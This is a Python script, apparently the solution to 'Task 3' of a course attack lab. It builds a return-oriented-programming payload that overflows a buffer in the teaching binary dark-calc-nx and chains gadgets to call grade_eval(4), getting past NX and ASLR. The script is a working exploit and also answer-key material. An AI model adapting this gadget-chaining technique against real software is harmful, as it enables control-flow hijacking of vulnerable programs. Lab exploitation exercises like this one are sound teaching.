#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

Goal: make dark-calc-nx call grade_eval(4) and print
"Hope A will be your grade!", with NX on and ASLR on.

dark-calc-nx has no fixed stack and its stack is not executable, so both the
address and the code of the previous task are unavailable.  We reuse code
that is already in the binary:

    0x401a33  pop %rdi ; ret     (inside __libc_csu_init)
    0x401a40  repz ret           (__libc_csu_fini, a plain ret for alignment)
    0x401978  grade_eval         (normal entry, frame pointer needed)

The chain contains no stack address at all, so ASLR does not matter: the
code segment of a non-PIE binary is at a fixed address.

Alignment: input()'s ret leaves %rsp 0 mod 16, pop %rdi;ret makes it 8 mod 16
again only after the extra repz ret, which is what printf()'s movaps needs.
"""
import struct
import sys

RET_SLOT = 24            # offset of input()'s saved return address
POP_RDI = 0x401A33       # pop %rdi ; ret
REPZ_RET = 0x401A40      # repz ret
GRADE_EVAL = 0x401978    # normal entry: cmpl $4,-0x4(%rbp)

payload = b"A" * RET_SLOT
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", REPZ_RET)
payload += struct.pack("<Q", GRADE_EVAL)

sys.stdout.buffer.write(payload + b"\n")
